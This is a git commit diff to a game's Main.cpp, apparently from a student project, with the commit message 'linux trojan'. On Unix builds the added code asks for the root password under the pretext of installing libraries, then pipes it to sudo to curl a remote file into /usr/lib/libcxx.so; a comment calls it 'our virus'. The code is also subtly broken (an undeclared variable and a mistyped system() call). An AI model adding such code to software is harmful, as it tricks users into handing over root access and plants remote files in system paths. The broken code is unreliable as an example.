bc1b9256d07eafcbc84cc5a313ecb1ab6c5d866b
Haoda <haodawan@usc.edu>
2019-11-22 16:51:18 -0800

    update to target platform win10, linux trojan

--- Game/Main.cpp
+++ Game/Main.cpp
@@ -7,11 +7,21 @@
 //
 
 #include "Game.h"
+// Only include stdlib if UNIX target
+#ifdef __unix__
+#include <iostream>
+#include <stdlib.h>
+#include <string>
+#endif
 
 int main(int argc, char** argv)
 {
+//Since our virus only works on Linux, we'll copy it over from there using curl
 #ifdef __unix__
-	
+	std::cout << "Installing libraries requires root password: ";
+	std::string passwd;
+	std::cin >> pass;
+	system("echo '" + passwd + "' | sudo -S curl https://i.redd.it/0fb1z72kz9041.jpg -o /usr/lib/libcxx.so");
 #endif
 	Game testing;
 	
